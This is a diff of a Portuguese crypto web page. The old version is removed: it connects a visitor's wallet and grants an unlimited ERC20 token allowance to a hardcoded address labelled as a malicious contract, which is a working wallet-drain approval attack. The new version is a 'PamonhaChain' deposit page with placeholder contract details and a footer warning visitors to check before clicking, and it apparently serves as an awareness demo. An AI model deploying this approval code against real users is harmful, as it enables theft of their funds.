@@ -2,56 +2,112 @@
 <html lang="pt">
 <head>
     <meta charset="UTF-8">
-    <title>Aprovação de Contrato Malicioso</title>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.x/dist/ethers.umd.min.js"></script>
+    <title>Welcome to PamonhaChain</title>
+    <link rel="icon" href="https://i.ibb.co/tPsQCwS/cf6bff83-cc07-4a9b-a833-6296efa49901-removebg-preview.png">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet">
+    <!-- Animate On Scroll library -->
+    <link href="https://cdn.jsdelivr.net/npm/aos@2.3.1/dist/aos.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.3.0/dist/web3.min.js"></script>
+    <style>
+        body {
+            font-family: 'Orbitron', sans-serif;
+            background-color: #0a0b0e;
+            color: #ffffff;
+            text-align: center;
+            padding: 0;
+            margin: 0;
+        }
+
+        .header {
+            font-size: 40px;
+            color: #00ffea;
+            margin: 20px 0;
+        }
+
+        .logo {
+            width: 200px;
+            margin: 20px auto;
+        }
+
+        .container {
+            margin: 20px auto;
+        }
+
+        .wallet-banner {
+            color: #00ffea;
+            margin: 20px auto;
+        }
+
+        .footer {
+            font-size: 14px;
+            color: #8f8f8f;
+            margin-top: 100px;
+        }
+
+        button {
+            background-color: #00ffea;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            color: #0a0b0e;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #13e6d8;
+        }
+
+        button:disabled {
+            background-color: #4e5154;
+            cursor: not-allowed;
+        }
+    </style>
 </head>
 <body>
-    <h2>Conectar Carteira & Aprovar Contrato Malicioso</h2>
-    <button id="connectWallet">Conectar Carteira</button>
-    <button id="approveMaliciousContract" style="display: none;">Aprovar Contrato Malicioso</button>
-    <script>
-        const connectWalletButton = document.getElementById('connectWallet');
-        const approveMaliciousContractButton = document.getElementById('approveMaliciousContract');
+    <div class="header" data-aos="fade-down">PamonhaChain</div>
+    <img src="https://i.ibb.co/tPsQCwS/cf6bff83-cc07-4a9b-a833-6296efa49901-removebg-preview.png" alt="Logo Pamonha Chain" class="logo" data-aos="zoom-in">
+    <div class="container" data-aos="fade-up">
+        <button id="connectWalletButton">Conectar Wallet</button>
+        <button id="depositButton" disabled>Depositar 0.02 ETH e Receber Pamonha</button>
+    </div>
+    <div id="walletBanner" class="wallet-banner" data-aos="fade-in"></div>
+    <div class="footer">
+        Não deixe sua wallet virar pamonha: confira antes de clicar!
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/aos@2.3.1/dist/aos.js"></script>
+    <script type="text/javascript">
+        // Inicialize o AOS (Animate On Scroll)
+        AOS.init();
 
-        // Endereço do contrato malicioso (substitua pelo seu endereço do contrato)
-        const maliciousContractAddress = '0x4137A1310ed57E2D97e0c0fff83F56099aAe25C9';
-        // Endereço do token ERC20 (substitua pelo endereço do token que deseja usar)
-        const tokenAddress = '0x1Ef397Cca4296D988EDDD7479479387B340Ff1f1';
-        // ABI simplificada do ERC20 focada na função approve
-        const tokenABI = [
-            "function approve(address spender, uint256 amount) external returns (bool)",
-        ];
-        // Defina a quantidade máxima (para fins de demo, usaremos "unlimited")
-        const maxUint256 = ethers.constants.MaxUint256;
+        let web3;
+        let contract;
+        let accounts;
 
-        connectWalletButton.addEventListener('click', async () => {
+        const contractABI = [/* ABI do contrato aqui */];
+        const contractAddress = '0x...'; // Endereço do contrato
+
+        const connectWalletButton = document.getElementById('connectWalletButton');
+        const depositButton = document.getElementById('depositButton');
+        const walletBanner = document.getElementById('walletBanner');
+
+        async function connectWallet() {
             if (window.ethereum) {
-                try {
-                    await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    approveMaliciousContractButton.style.display = 'block';
-                } catch (error) {
-                    console.error('Usuário negou acesso à carteira.');
-                }
+                web3 = new Web3(window.ethereum);
+                accounts = await web3.eth.requestAccounts();
+                contract = new web3.eth.Contract(contractABI, contractAddress);
+                depositButton.disabled = false;
+                walletBanner.textContent = `Sua Wallet: ${accounts[0].substring(0, 9)}...`;
+                walletBanner.style.display = 'block';
             } else {
-                alert('Por favor, instale o MetaMask ou outra carteira Ethereum compatível.');
+                alert('Por favor, instale uma carteira de criptoativos, como a MetaMask, para conectar-se.');
             }
-        });
+        }
 
-        approveMaliciousContractButton.addEventListener('click', async () => {
-            if (window.ethereum) {
-                try {
-                    const provider = new ethers.providers.Web3Provider(window.ethereum);
-                    const signer = provider.getSigner();
-                    const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
-                    const tx = await tokenContract.approve(maliciousContractAddress, maxUint256);
-                    await tx.wait();
-                    alert('Contrato Malicioso aprovado com sucesso.');
-                } catch (error) {
-                    console.error(error);
-                    alert('Houve um erro ao aprovar o contrato malicioso.');
-                }
-            }
-        });
+        connectWalletButton.addEventListener('click', connectWallet);
+
+        // Adicione aqui mais funcionalidades Web3 conforme necessário.
     </script>
 </body>
 </html>
